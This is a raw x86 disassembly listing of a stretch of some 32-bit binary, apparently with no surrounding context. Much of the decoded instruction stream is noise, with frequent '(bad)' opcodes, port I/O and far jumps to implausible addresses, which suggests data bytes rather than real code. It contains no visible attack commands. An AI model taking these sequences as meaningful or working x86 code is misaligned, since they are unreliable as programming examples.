  421669:	adc    edx,esi
  42166b:	sbb    eax,0x2e1aa339
  421670:	mov    BYTE PTR [esi*2+0x6ffc88e9],dl
  421677:	or     DWORD PTR [ecx],esi
  421679:	imul   esi,DWORD PTR [ecx+0x3c],0xc
  42167d:	adc    eax,0x900010ba
  421682:	or     ah,BYTE PTR ds:0x95
  421688:	add    BYTE PTR [eax],al
  42168a:	nop
  42168b:	mov    edx,DWORD PTR [ecx]
  42168d:	or     eax,0x134f13
  421692:	nop
  421693:	adc    BYTE PTR [edi-0x292147dd],bl
  421699:	and    eax,DWORD PTR [eax+0x3813dd06]
  42169f:	sbb    al,0x8a
  4216a1:	(bad)  
  4216a2:	aas    
  4216a3:	adc    BYTE PTR [ebx+0x73],dl
  4216a6:	jb     0x421699
  4216a8:	dec    BYTE PTR [edx-0x773e7c29]
  4216ae:	int3   
  4216af:	ja     0x42169a
  4216b1:	add    BYTE PTR [esi-0x44],dl
  4216b4:	and    eax,0xd185b412
  4216b9:	call   DWORD PTR [edx]
  4216bb:	push   eax
  4216bc:	push   ss
  4216bd:	inc    ebx
  4216be:	adc    edx,DWORD PTR [esi-0x2]
  4216c1:	xchg   BYTE PTR [edi+ebp*2+0x9],ch
  4216c5:	xchg   DWORD PTR [edi+esi*2-0x37],edi
  4216c9:	mov    ah,BYTE PTR [edi-0x4e]
  4216cc:	(bad)  
  4216ce:	sbb    ch,bh
  4216d0:	adc    ebp,eax
  4216d2:	push   ss
  4216d3:	pop    es
  4216d4:	sbb    al,0xa4
  4216d6:	out    dx,eax
  4216d7:	mov    esi,0x3790043b
  4216dc:	aaa    
  4216dd:	pop    es
  4216de:	(bad)  
  4216e0:	test   BYTE PTR [ebx],0x90
  4216e3:	sub    DWORD PTR ds:0xf75fb22c,esi
  4216e9:	add    edx,DWORD PTR [ebx+esi*2]
  4216ec:	in     al,0x80
  4216ee:	add    BYTE PTR [eax],al
  4216f0:	add    BYTE PTR [eax],al
  4216f2:	add    BYTE PTR [edi-0x4d],cl
  4216f5:	test   DWORD PTR [ebx],0xdfb32f45
  4216fb:	imul   ecx,DWORD PTR [edx+0x7d8f4f2a],0x7b
  421702:	inc    esp
  421703:	xchg   esp,eax
  421704:	aaa    
  421705:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  421706:	add    al,0x90
  421708:	mov    dl,0x78
  42170a:	dec    ecx
  42170b:	je     0x42173e
  42170d:	jnp    0x4216ee
  42170f:	mov    ebx,0x651c73c0
  421714:	push   es
  421715:	adc    al,0xc8
  421717:	or     ch,dh
  421719:	sbb    ebp,eax
  42171b:	mov    ebp,0x4f5b218a
  421720:	jge    0x421782
  421722:	sub    edx,DWORD PTR [edx]
  421724:	(bad)  
  421725:	cld    
  421726:	mov    ecx,DWORD PTR [edi+0x903f7b3]
  42172c:	not    BYTE PTR [ebx]
  42172e:	loopne 0x421748
  421730:	repnz sti 
  421732:	mov    dh,bh
  421734:	xor    esi,esi
  421736:	add    edx,DWORD PTR [eax+0x17d5e98a]
  42173c:	jge    0x421706
  42173e:	push   ecx
  42173f:	inc    esi
  421740:	push   edx
  421741:	in     al,0x3
  421743:	nop
  421744:	test   DWORD PTR [esi-0x78],esp
  421747:	push   ebx
  421748:	(bad)  
  421749:	push   cs
  42174a:	sub    eax,0xda96730d
  42174f:	xchg   ebx,eax
  421750:	mov    dl,0x40
  421752:	mov    ecx,0x2f99e5bc
  421757:	add    BYTE PTR [eax],al
  421759:	add    BYTE PTR [eax],al
  42175b:	add    BYTE PTR [ebx-0x6c17b192],ch
  421761:	xor    esp,esi
  421763:	call   0xea0745fe
  421768:	xchg   ebx,eax
  421769:	mov    dl,0xed
  42176b:	lods   eax,DWORD PTR ds:[esi]
  42176c:	ffreep st(0)
  42176e:	idiv   BYTE PTR [eax]
  421770:	sbb    BYTE PTR [ebp-0x13],bh
  421773:	cli    
  421774:	pop    esp
  421775:	xor    esi,ecx
  421777:	jb     0x421760
  421779:	shl    BYTE PTR [edx],1
  42177b:	out    dx,al
  42177c:	add    BYTE PTR [ecx+ebx*4],bh
  42177f:	test   eax,0x798e2997
  421784:	xchg   esp,eax
  421785:	mov    dl,0xe
  421787:	jo     0x4217d0
  421789:	shl    BYTE PTR [esi],1
  42178b:	ins    BYTE PTR es:[edi],dx
  42178c:	inc    ebx
  42178d:	aam    0x44
  42178f:	pusha  
  421790:	dec    edi
  421791:	rcl    BYTE PTR [edx-0x12],1
  421794:	lahf   
  421795:	add    BYTE PTR [eax],0x29
  421798:	mov    WORD PTR [ecx],gs
  42179a:	push   edx
  42179b:	add    eax,0xe146c55c
  4217a0:	and    eax,0x3025d4aa
  4217a5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4217a6:	verr   WORD PTR [esp+eiz*4+0x65]
  4217ab:	in     eax,0xb
  4217ad:	fdiv   DWORD PTR [edx]
  4217af:	fiadd  WORD PTR [ebp+0x7f]
  4217b2:	add    eax,ecx
  4217b4:	xor    dl,0xe
  4217b7:	imul   ebp,eax,0x8e905cf
  4217bd:	call   0x4240f4
  4217c2:	add    BYTE PTR [eax],al
  4217c4:	add    BYTE PTR [ebp-0x2f9e31da],cl
  4217ca:	iret   
  4217cb:	pop    esi
  4217cc:	add    BYTE PTR [edi+eiz*8+0x60],dh
  4217d0:	add    al,0x75
  4217d2:	mul    BYTE PTR [ecx+0x1d]
  4217d5:	jb     0x421849
  4217d7:	xor    DWORD PTR [ecx+edx*4],esp
  4217da:	cs (bad) 
  4217dc:	(bad)  
  4217dd:	stc    
  4217de:	pusha  
  4217df:	jmp    0xe548:0x963e9574
  4217e6:	outs   dx,BYTE PTR ds:[esi]
  4217e7:	xchg   esi,eax
  4217e8:	mov    DWORD PTR [ecx],edi
  4217ea:	scas   eax,DWORD PTR es:[edi]
  4217eb:	push   cs
  4217ec:	add    BYTE PTR [ecx+0x2b],ah
  4217ef:	sub    al,BYTE PTR [ecx]
  4217f1:	test   eax,0xaf79f8fc
  4217f6:	dec    ecx
  4217f7:	in     al,dx
  4217f8:	push   esi
  4217f9:	dec    esp
  4217fa:	push   0x31
  4217fc:	xor    BYTE PTR [ecx-0x56ff3a80],al
  421802:	retf   0x5119
  421805:	(bad)  
  421806:	ins    BYTE PTR es:[edi],dx
  421807:	cwde   
  421808:	dec    esp
  421809:	push   ebp
  42180a:	mov    esi,ebp
  42180c:	pop    ds
  42180d:	mov    al,0xb6
  42180f:	push   cs
  421810:	test   BYTE PTR [ecx-0x4a74e1be],ch
  421816:	xchg   edx,eax
  421817:	sub    DWORD PTR [esi],eax
  421819:	jns    0x4217ca
  42181b:	aam    0x44
  42181d:	xchg   ebp,eax
  42181e:	lods   al,BYTE PTR ds:[esi]
  42181f:	in     eax,dx
  421820:	test   BYTE PTR [edi+0x4b],al
  421823:	sbb    bh,bh
  421825:	mov    ch,0x92
  421827:	dec    ecx
  421828:	mov    eax,DWORD PTR [eax]
  42182a:	add    BYTE PTR [eax],al
  42182c:	add    BYTE PTR [eax],al
  42182e:	das    
  42182f:	(bad)  
  421830:	in     al,0xda
  421832:	cmp    DWORD PTR [edi-0x5d2f3f6f],ebp
  421838:	cdq    
  421839:	dec    esp
  42183a:	test   DWORD PTR [esi-0x50fb630b],ecx
  421840:	push   cs
  421841:	push   DWORD PTR [ebp-0x6e]
  421844:	sub    DWORD PTR [ecx+0x6295b9d],ecx
  42184a:	nop
  42184b:	mov    DWORD PTR [ecx],edx
  42184d:	mov    DWORD PTR [ebp+esi*2+0x9],edi
  421851:	mov    DWORD PTR [ebp+ebp*2-0x3f],ebx
  421855:	mov    BYTE PTR [ebp+esi*2+0x6d7488dd],al
  42185c:	int    0x41
  42185e:	adc    edx,DWORD PTR [ebx-0x17]
  421861:	xchg   BYTE PTR [ebp*4-0x4a9b793e],bh
  421868:	mov    esi,0xf2ad3c38
  42186d:	jp     0x42180c
  42186f:	adc    dh,dl
  421871:	and    edi,DWORD PTR [edx+eiz*8+0x4e]
  421875:	cli    
  421876:	mov    edi,0x6c7b96bb
  42187b:	lods   eax,DWORD PTR ds:[esi]
  42187c:	xchg   edi,eax
  42187d:	jae    0x4218f3
  42187f:	jge    0x421817
  421881:	dec    ebx
  421882:	ins    BYTE PTR es:[edi],dx
  421883:	mov    ch,0x3a
  421885:	mov    edx,0x89118907
  42188a:	dec    esp
  42188b:	ins    DWORD PTR es:[edi],dx
  42188c:	lods   eax,DWORD PTR ds:[esi]
  42188d:	xchg   ah,dl
  42188f:	outs   dx,DWORD PTR ds:[esi]
  421890:	add    eax,0x89
  421895:	add    BYTE PTR [eax],al
  421897:	int3   
  421898:	fnstenv [bx+si]
  42189b:	dec    ecx
  42189c:	add    ebp,DWORD PTR [esi+0x4bb3b023]
  4218a2:	xchg   esp,eax
  4218a3:	nop
  4218a4:	mov    edx,DWORD PTR [esi+0x6bbfac43]
  4218aa:	inc    ebx
  4218ab:	mov    ah,0xeb
  4218ad:	pop    DWORD PTR [ebx-0x54]
  4218b0:	jmp    0x421874
  4218b2:	sub    dl,BYTE PTR [bp+si-0x2c]
  4218b6:	(bad)  
  4218b7:	mov    ecx,0x747321b3
  4218bc:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4218bd:	imul   ebx,DWORD PTR [ebx+0x6c],0xffffff97
  4218c1:	and    DWORD PTR [ebx+0x74],esi
  4218c4:	ja     0x421930
  4218c6:	pop    ebx
  4218c7:	ins    BYTE PTR es:[edi],dx
  4218c8:	mov    dl,0x53
  4218ca:	dec    edx
  4218cb:	ror    esi,cl
  4218cd:	das    
  4218ce:	add    eax,0x5e36828
  4218d3:	nop
  4218d4:	xor    eax,0xf71018b3
  4218d9:	fistp  DWORD PTR [ecx]
  4218db:	jmp    FWORD PTR [eax+0x79fae273]
  4218e1:	fs jg  0x42193f
  4218e4:	into   
  4218e5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4218e6:	sbb    eax,DWORD PTR [esi+0x21]
  4218e9:	test   DWORD PTR [ebx],0xf013ef09
  4218ef:	or     bh,dl
  4218f1:	sbb    ebx,esp
  4218f3:	adc    dh,BYTE PTR [ebx-0x34]
  4218f6:	xchg   edx,eax
  4218f7:	push   ebx
  4218f8:	into   
  4218f9:	int    0xf6
  4218fb:	add    BYTE PTR [eax],al
  4218fd:	add    BYTE PTR [eax],al
  4218ff:	add    dh,dl
  421901:	mov    ah,BYTE PTR [eax+0x7079b79a]
  421907:	shl    BYTE PTR [ebx-0x6a],0x4f
  42190b:	(bad)  
  42190c:	cld    
  42190d:	mov    dl,0xf7
  42190f:	jle    0x4218d9
  421911:	mov    dh,al
  421913:	call   0xa0b3:0xc8717997
  42191a:	mov    esp,0x76ddead1
  42191f:	dec    eax
  421920:	mov    bl,0xb0
  421922:	test   DWORD PTR [ebx],0xd8f7aa52
  421928:	sbb    BYTE PTR [esi+0x355f2878],al
  42192e:	ret    
  42192f:	or     eax,ecx
  421931:	fbld   TBYTE PTR ds:0xc45b08db
  421937:	sbb    BYTE PTR [esp+eiz*4],dh
  42193a:	aaa    
  42193b:	add    al,0xf
  42193d:	out    dx,al
  42193e:	sbb    ecx,DWORD PTR [ebx+edi*8]
  421941:	push   ecx
  421942:	test   BYTE PTR [ebx],0x90
  421945:	sub    eax,0xb3982a0e
  42194a:	rcr    DWORD PTR [ecx],cl
  42194c:	arpl   WORD PTR [esi+ebx*8+0x1f7953fb],sp
  421953:	test   eax,0xfb32f59b
  421958:	stos   DWORD PTR es:[edi],eax
  421959:	popf   
  42195a:	ret    0x93e9
  42195d:	sub    esp,esi
  42195f:	ins    BYTE PTR es:[edi],dx
  421960:	ret    0x7904
  421963:	adc    eax,DWORD PTR [eax]
  421965:	add    BYTE PTR [eax],al
  421967:	add    BYTE PTR [eax],al
  421969:	mov    WORD PTR [edi+ecx*1],cs
  42196c:	bound  ebp,QWORD PTR [esi-0x5d8d946f]
  421972:	jbe    0x421906
  421974:	sub    DWORD PTR [eax],ebx
  421976:	retf   0x2921
  421979:	cmc    
  42197a:	js     0x4219a9
  42197c:	mov    ecx,0xbdf66a4e
  421981:	jbe    0x4219f9
  421983:	in     eax,dx
  421984:	ins    DWORD PTR es:[edi],dx
  421985:	push   ebx
  421986:	add    al,0x9
  421988:	jb     0x421958
  42198a:	mov    ah,0x76
  42198c:	sub    DWORD PTR [edx+0x232e0eaf],edi
  421992:	sbb    eax,0x7793e90f
  421997:	add    esi,ebp
  421999:	jle    0x42198d
  42199b:	push   cs
  42199c:	ins    BYTE PTR es:[edi],dx
  42199d:	rol    DWORD PTR [ebx],cl
  42199f:	or     eax,0xcec19a02
  4219a4:	test   eax,0xdb32f3fb
  4219a9:	ret    0xf2a4
  4219ac:	fist   DWORD PTR [ebx+0x78]
  4219af:	xchg   esi,eax
  4219b0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4219b1:	outs   dx,DWORD PTR ds:[esi]
  4219b2:	mov    al,ds:0x77c5aff6
  4219b7:	in     eax,dx
  4219b8:	jb     0x42195e
  4219ba:	xor    al,0xed
  4219bc:	pop    ebp
  4219bd:	out    dx,al
  4219be:	xor    al,0xed
  4219c0:	fimul  WORD PTR [edi]
  4219c2:	push   es
  4219c3:	adc    DWORD PTR [eax],eax
  4219c5:	sub    DWORD PTR [eax+ebx*4-0x6d5f72bc],esi
  4219cc:	rol    BYTE PTR [eax],0x0
  4219cf:	add    BYTE PTR [eax],al
  4219d1:	add    BYTE PTR [esi],dh
  4219d3:	xor    DWORD PTR [edx-0x664bc700],eax
  4219d9:	push   esp
  4219da:	dec    ebp
  4219db:	xchg   esp,eax
  4219dc:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4219dd:	retf   
  4219de:	sub    DWORD PTR [esi+ecx*1-0x11f24418],esi
  4219e5:	jmp    FWORD PTR [esi+ebp*8+0x61]
  4219e9:	push   ss
  4219ea:	push   0x42
  4219ec:	xor    DWORD PTR [eax],esp
  4219ee:	in     eax,dx
  4219ef:	inc    eax
  4219f0:	sbb    cl,BYTE PTR [ebx-0x762a08d7]
  4219f6:	fisttp QWORD PTR [edi+0x19d6e80d]
  4219fc:	in     eax,dx
  4219fd:	inc    DWORD PTR [edx+0x7b]
  421a00:	xchg   esi,eax
  421a01:	enter  0x5c51,0x83
  421a05:	add    BYTE PTR [ecx-0x6a171c82],bh
  421a0b:	mov    al,0xeb
  421a0d:	inc    DWORD PTR [edx-0x6a]
  421a10:	nop
  421a11:	imul   ch
  421a13:	xchg   si,ax
  421a15:	int    0x92
  421a17:	hlt    
  421a18:	ins    BYTE PTR es:[edi],dx
  421a19:	stc    
  421a1a:	sub    DWORD PTR [eax+0x72ff0014],ecx
  421a20:	xchg   esi,eax
  421a21:	setno  BYTE PTR [ebx+eax*4+0x0]
  421a26:	jns    0x421a56
  421a28:	xor    al,BYTE PTR [eax]
  421a2a:	jmp    0xf5f2:0x2001149
  421a31:	ror    BYTE PTR [edx+0x8b0eae],0x0
  421a38:	add    BYTE PTR [eax],al
  421a3a:	add    BYTE PTR [esi-0x65],al
  421a3d:	or     al,0x96
  421a3f:	imul   esi,DWORD PTR [ebx-0x5abe3069],0x89900084
  421a49:	ins    BYTE PTR es:[edi],dx
  421a4a:	adc    BYTE PTR [eax-0x5503c680],0x85
  421a51:	ins    BYTE PTR es:[edi],dx
  421a52:	push   ebx
  421a53:	ins    BYTE PTR es:[edi],dx
  421a54:	test   eax,0x8990c879
  421a59:	adc    DWORD PTR [edi-0x180d5234],eax
  421a5f:	sti    
  421a60:	jmp    0x49a51a76
  421a65:	mov    edi,edi
  421a67:	iret   
  421a68:	mov    ecx,0xd4f8c86b
  421a6d:	cmp    edi,esp
  421a6f:	jmp    DWORD PTR [ecx]
  421a71:	push   0xfffffffe
  421a73:	test   DWORD PTR [eax-0x10073396],0x4ee7ff45
  421a7d:	aad    0x23
  421a7f:	or     BYTE PTR [ecx-0x7704fbf7],0x11
  421a86:	xor    ecx,ebx
  421a88:	add    al,0x52
  421a8a:	imul   edx,DWORD PTR [ecx-0x37bcf1bf],0x44860c7b
  421a94:	lods   eax,DWORD PTR ds:[esi]
  421a95:	div    BYTE PTR [esi]
  421a97:	aas    
  421a98:	test   DWORD PTR [esi],ecx
  421a9a:	mov    ?,WORD PTR [ecx+0x1188]
  421aa0:	add    BYTE PTR [eax],al
  421aa2:	add    BYTE PTR [eax],al
  421aa4:	arpl   WORD PTR [edi+0x7d6c7368],dx
  421aaa:	push   0x48
  421aac:	xchg   esp,eax
  421aad:	mov    bl,0xe
  421aaf:	mov    BYTE PTR [eax-0x70406a75],dl
  421ab5:	pop    es
  421ab6:	sub    edi,edi
  421ab8:	ja     0x421a46
  421aba:	push   0x4
  421abc:	xchg   ebx,eax
  421abd:	lds    ebp,FWORD PTR [eax+0x43]
  421ac0:	lods   al,BYTE PTR ds:[esi]
  421ac1:	ins    BYTE PTR es:[di],dx
  421ac3:	inc    edi
  421ac4:	mov    BYTE PTR [edx-0x4cc61141],dh
  421aca:	test   DWORD PTR [edi-0x272000f1],0x90cf6618
  421ad4:	fs mov bl,0xf7
  421ad7:	rcl    BYTE PTR [eax],0x85
  421ada:	psllq  mm5,mm7
  421add:	repnz outs dx,DWORD PTR ds:[esi]
  421adf:	enter  0xa073,0xce
  421ae3:	jle    0x421b04
  421ae5:	jbe    0x421ade
  421ae7:	inc    ebp
  421ae8:	ror    esi,cl
  421aea:	call   0xfc3433f2
  421aef:	jp     0x421b28
  421af1:	xor    esi,esi
  421af3:	add    edx,DWORD PTR [eax-0x8359e76]
  421af9:	jne    0x421aa3
  421afb:	push   ecx
  421afc:	es push ebx
  421afe:	hlt    
  421aff:	add    edx,DWORD PTR [eax+0x1ff3667d]
  421b05:	repz pusha 
  421b07:	add    BYTE PTR ds:[eax],al
  421b0a:	add    BYTE PTR [eax],al
  421b0c:	add    BYTE PTR [esi+0x70],dl
  421b0f:	(bad)
  421b13:	test   eax,0xfce432e
  421b18:	aam    0xbc
  421b1a:	(bad)  
  421b1b:	sbb    ebx,esp
  421b1d:	scas   eax,DWORD PTR es:[edi]
  421b1e:	and    ebx,ebp
  421b20:	add    al,0x90
  421b22:	das    
  421b23:	aaa    
  421b24:	scas   eax,DWORD PTR es:[edi]
  421b25:	pop    esi
  421b26:	sub    BYTE PTR [ebx+0x377480e7],dh
  421b2c:	jl     0x421b81
  421b2e:	into   
  421b2f:	call   0x4345aa23
  421b34:	sbb    al,0x2f
  421b36:	out    0xf6,eax
  421b38:	add    edx,DWORD PTR [edx+esi*2]
  421b3b:	imul   ebp,esp,0x8
  421b3e:	out    dx,al
  421b3f:	ror    DWORD PTR [edi],cl
  421b41:	outs   dx,BYTE PTR ds:[esi]
  421b42:	repnz push cs
  421b44:	mov    esi,0xad25b5e9
  421b49:	xchg   ecx,eax
  421b4a:	add    BYTE PTR ds:0xf666db3c,bl
  421b50:	add    al,0xe7
  421b52:	jne    0x421b41
  421b54:	(bad)  
  421b55:	call   eax
  421b57:	add    al,dl
  421b59:	adc    ch,BYTE PTR [edx]
  421b5b:	bound  ecx,QWORD PTR ds:0xd18f8b98
  421b61:	data16 jne 0x421b50
  421b64:	mov    dh,0xaa
  421b66:	jmp    0xb4dee89d
  421b6b:	adc    bl,dl
  421b6d:	shl    DWORD PTR [ebp+0x28d4],cl
  421b73:	add    BYTE PTR [eax],al
  421b75:	add    BYTE PTR [edi],al
  421b77:	jne    0x421b0e
  421b79:	sub    eax,0x1599a2f8
  421b7e:	call   0x4dac6f23
  421b83:	mov    ebp,0xa0f7f597
  421b88:	sub    DWORD PTR [esi],eax
  421b8a:	cwde   
  421b8b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  421b8c:	call   0x1a72:0xed76aec4
  421b93:	mov    cl,0x78
  421b95:	jmp    0x421b7d
  421b97:	mov    eax,cs
  421b99:	ins    BYTE PTR es:[edi],dx
  421b9a:	xchg   ebx,eax
  421b9b:	mov    dl,0x1d
  421b9d:	xchg   edi,eax
  421b9e:	call   eax
  421ba0:	add    BYTE PTR [ebp+0x53],ch
  421ba3:	or     edx,DWORD PTR [eax]
  421ba5:	mov    eax,ds:0x6dd6efae
  421baa:	add    DWORD PTR fs:[esi],edx
  421bad:	bound  ebx,QWORD PTR [esi-0x73]
  421bb0:	inc    esi
  421bb1:	cmp    edx,DWORD PTR [ebx-0x68616e4e]
  421bb7:	shr    BYTE PTR [ebx-0x2a],0x12
  421bbb:	not    DWORD PTR [edx]
  421bbd:	lock inc eax
  421bbf:	repz in eax,dx
  421bc1:	add    BYTE PTR [esp+ecx*8-0x1],dl
  421bc5:	aas    
  421bc6:	jns    0x421c21
  421bc8:	push   ecx
  421bc9:	and    al,0x41
  421bcb:	sub    DWORD PTR [ebp-0x12],0x27
  421bcf:	mov    al,0x64
  421bd1:	xor    dl,BYTE PTR [esi+0x28b0e18]
  421bd7:	xchg   edi,eax
  421bd8:	pop    ds
  421bd9:	stc    
  421bda:	add    BYTE PTR [eax],al
  421bdc:	add    BYTE PTR [eax],al
  421bde:	add    BYTE PTR [esi-0x3a],bl
  421be1:	xchg   ecx,eax
  421be2:	shl    ah,0xa8
  421be5:	js     0x421be7
  421be7:	jecxz  0x421b97
  421be9:	xchg   edi,eax
  421bea:	retf   
  421beb:	inc    ecx
  421bec:	xchg   edx,eax
  421bed:	in     al,0xff
  421bef:	fisubr WORD PTR [edx]
  421bf1:	lods   eax,DWORD PTR ds:[esi]
  421bf2:	jne    0x421c26
  421bf4:	sbb    ch,ch
  421bf6:	imul   ebp,DWORD PTR [ebx],0x5e8d6fb
  421bfc:	leave  
  421bfd:	jmp    0xa912:0xf29c1eff
  421c04:	scas   al,BYTE PTR es:[edi]
  421c05:	xchg   ebp,eax
  421c06:	inc    esp
  421c07:	lds    esp,FWORD PTR [edi+0x19010f97]
  421c0d:	add    DWORD PTR [eax],0xe8dafaf9
  421c13:	mov    bl,BYTE PTR [edx]
  421c15:	in     eax,dx
  421c16:	jmp    DWORD PTR [edx+0x71]
  421c19:	adc    DWORD PTR [ebp+0xeb019],edi
  421c1f:	mov    edx,0xc4ff5dec
  421c24:	xchg   edi,eax
  421c25:	(bad)  
  421c26:	aas    
  421c27:	test   eax,0x22044efa
  421c2c:	dec    BYTE PTR [ecx-0x95046ff]
  421c32:	pop    edi
  421c33:	add    BYTE PTR [eax+0x75b330e],dh
  421c39:	ds jne 0x421cb5
  421c3c:	scas   eax,DWORD PTR es:[edi]
  421c3d:	jecxz  0x421c30
  421c3f:	nop
  421c40:	or     dl,BYTE PTR [ecx+0x3f]
  421c43:	add    BYTE PTR [eax],al
  421c45:	add    BYTE PTR [eax],al
  421c47:	add    BYTE PTR [edi],al
  421c49:	adc    DWORD PTR [ecx],0x5acde52
  421c4f:	adc    al,0x83
  421c51:	dec    ecx
  421c52:	adc    DWORD PTR [ebx+0x16948c50],eax
  421c58:	pop    ebp
  421c59:	test   BYTE PTR [edx],bh
  421c5b:	call   0x4111ce4
  421c60:	xchg   ebx,eax
  421c61:	dec    esi
  421c62:	sar    esp,0x9d
  421c65:	jno    0x421c66
  421c67:	aas    
  421c68:	nop
  421c69:	(bad)  
  421c6a:	fcomp  QWORD PTR [edx-0x25]
  421c6d:	add    BYTE PTR ds:0x679e535a,dh
  421c73:	jmp    0x421c86
  421c75:	ins    DWORD PTR es:[edi],dx
  421c76:	jno    0x421c79
  421c78:	nop
  421c79:	mov    DWORD PTR [esi+0x3900bf55],edi
  421c7f:	xor    bl,ch
  421c81:	and    DWORD PTR [edx+0x4c],0xffffff8c
  421c85:	mov    ds:0x8c85c695,eax
  421c8a:	js     0x421c4f
  421c8c:	nop
  421c8d:	mov    DWORD PTR [ecx],edx
  421c8f:	jmp    0x7fd253d
  421c94:	out    0x74,eax
  421c96:	fimul  WORD PTR [edx-0x3c256fb]
  421c9c:	xlat   BYTE PTR ds:[ebx]
  421c9d:	loopne 0x421c98
  421c9f:	mov    esp,0x743a8990
  421ca4:	cwde   
  421ca5:	push   cs
  421ca6:	xchg   ebp,eax
  421ca7:	pop    edi
  421ca8:	mov    ebp,0x4f3ae3
  421cad:	add    BYTE PTR [eax],al
  421caf:	add    BYTE PTR [eax],al
  421cb1:	arpl   si,di
  421cb3:	xchg   esp,eax
  421cb4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  421cb5:	scas   al,BYTE PTR es:[edi]
  421cb6:	mov    bl,0x3a
  421cb8:	addr16 inc ecx
  421cba:	mov    dl,BYTE PTR [ecx]
  421cbc:	add    BYTE PTR [eax-0xf],al
  421cbf:	ret    0x9141
  421cc2:	mov    dl,0xf7
  421cc4:	adc    BYTE PTR [ebx-0x39],0x72
  421cc8:	inc    ebx
  421cc9:	add    eax,ebx
  421ccb:	ds ins DWORD PTR es:[edi],dx
  421ccd:	jg     0x421d41
  421ccf:	idiv   DWORD PTR [esi+0x22]
  421cd2:	sbb    edx,DWORD PTR ds:0xf25b6c2c
  421cd8:	ins    BYTE PTR es:[edi],dx
  421cd9:	addr16 jb 0x421ceb
  421cdc:	inc    edx
  421cdd:	(bad)  
  421cde:	mov    dl,0xf7
  421ce0:	js     0x421d31
  421ce2:	pop    ebx
  421ce3:	retf   0x4f4b
  421ce6:	jb     0x421d48
  421ce8:	mov    cl,0x9b
  421cea:	cmp    edi,ebp
  421cec:	cmp    bh,0xe7
  421cef:	hlt    
  421cf0:	cmc    
  421cf1:	neg    DWORD PTR [ebx+0x7f]
  421cf4:	add    al,0x90
  421cf6:	mov    dl,0x5e
  421cf8:	rcr    DWORD PTR [ebx+0x66a2b7a5],0x11
  421cff:	hlt    
  421d00:	js     0x421ccc
  421d02:	mov    esi,0x3c4f90e4
  421d07:	xor    ch,BYTE PTR [eax]
  421d09:	out    dx,eax
  421d0a:	mov    al,ds:0x36fc2bb4
  421d0f:	mov    bh,0xb0
  421d11:	sbb    ah,0xfb
  421d14:	fwait
  421d15:	add    BYTE PTR [eax],al
  421d17:	add    BYTE PTR [eax],al
  421d19:	add    bh,bl
  421d1b:	cmp    eax,0x3d570437
  421d20:	cmc    
  421d21:	fwait
  421d22:	(bad)  
  421d23:	mov    dl,0xf7
  421d25:	add    ebp,eax
  421d27:	jb     0x421d79
  421d29:	add    al,0x90
  421d2b:	ss aaa 
  421d2d:	mov    al,0x6a
  421d2f:	fsubr  st(7),st
  421d31:	sub    al,BYTE PTR [esi+edi*4-0x5a]
  421d35:	jle    0x421cbc
  421d37:	ficomp DWORD PTR [edi]
  421d39:	add    al,0x90
  421d3b:	mov    dl,0x3f
  421d3d:	pop    esi
  421d3e:	enter  0xeb2,0xe9
  421d42:	pop    ds
  421d43:	xor    DWORD PTR [edx-0x5a],esp
  421d46:	cmc    
  421d47:	mov    ch,0x9b
  421d49:	lods   al,BYTE PTR ds:[esi]
  421d4a:	mov    bh,0x1
  421d4c:	inc    eax
  421d4d:	jb     0x421cd9
  421d4f:	(bad)  
  421d51:	jmp    0x7b38cfe9
  421d56:	(bad)  
  421d57:	jno    0x421d46
  421d59:	ins    DWORD PTR es:[edi],dx
  421d5a:	aam    0xe5
  421d5c:	push   ds
  421d5d:	ins    BYTE PTR es:[edi],dx
  421d5e:	adc    DWORD PTR [ecx],ebx
  421d60:	in     al,dx
  421d61:	imul   BYTE PTR [edx-0x2b11ff]
  421d67:	ret    0xe94e
  421d6a:	arpl   WORD PTR [ebx+edx*4],di
  421d6d:	xchg   ecx,eax
  421d6e:	jns    0x421dde
  421d70:	in     eax,dx
  421d71:	cmp    DWORD PTR [ebp+0x3a],esp
  421d74:	sbb    al,0x41
  421d76:	ja     0x421de9
  421d78:	in     eax,dx
  421d79:	jmp    0xea0bfa09
  421d7e:	add    BYTE PTR [eax],al
  421d80:	add    BYTE PTR [eax],al
  421d82:	add    BYTE PTR [ebx+0x1e3dce36],dl
  421d88:	cmp    dl,BYTE PTR [ebx-0x27]
  421d8b:	push   ds
  421d8c:	js     0x421ddd
  421d8e:	jno    0x421d9b
  421d90:	pop    edx
  421d91:	add    al,0x72
  421d93:	add    DWORD PTR [esp+eiz*8],esi
  421d96:	sbb    eax,0x811c39fa
  421d9b:	mov    ebp,0x6ee90e43
  421da0:	jg     0x421d98
  421da2:	xchg   edx,eax
  421da3:	std    
  421da4:	jo     0x421d93
  421da6:	arpl   WORD PTR [esi-0x35f130c5],bx
  421dac:	or     eax,ebx
  421dae:	sub    eax,edi
  421db0:	jo     0x421df5
  421db2:	jb     0x421e30
  421db4:	push   es
  421db5:	call   0x3635:0x1475bfd7
  421dbc:	mov    cl,0xe
  421dbe:	add    BYTE PTR [esp+ebx*4],bh
  421dc1:	popa   
  421dc2:	push   cs
  421dc3:	and    ch,BYTE PTR [ebp+esi*8-0x38]
  421dc7:	cmp    esi,DWORD PTR [ebp-0x328974f2]
  421dcd:	lods   al,BYTE PTR ds:[esi]
  421dce:	xchg   edx,eax
  421dcf:	jns    0x421d85
  421dd1:	in     al,0x44
  421dd3:	dec    ebp
  421dd4:	push   0x646fc6ec
  421dd9:	xchg   edi,eax
  421dda:	inc    eax
  421ddb:	imul   esp,DWORD PTR [eax],0xcba78b12
  421de1:	mov    eax,0x4bb47992
  421de6:	mov    eax,DWORD PTR [eax]
  421de8:	add    BYTE PTR [eax],al
  421dea:	add    BYTE PTR [eax],al
  421dec:	scas   eax,DWORD PTR es:[edi]
  421ded:	jns    0x421dbe
  421def:	add    al,0x69
  421df1:	fadd   QWORD PTR [ebx+eiz*4+0x55ce35be]
  421df8:	ret    0x8eca
  421dfb:	in     al,0x61
  421dfd:	ss stc 
  421dff:	cmp    BYTE PTR [edx+0x7f],bh
  421e02:	inc    ebx
  421e03:	push   edi
  421e04:	mov    ds:0xb4db1ecb,al
  421e09:	jb     0x421e3c
  421e0b:	and    al,0xb0
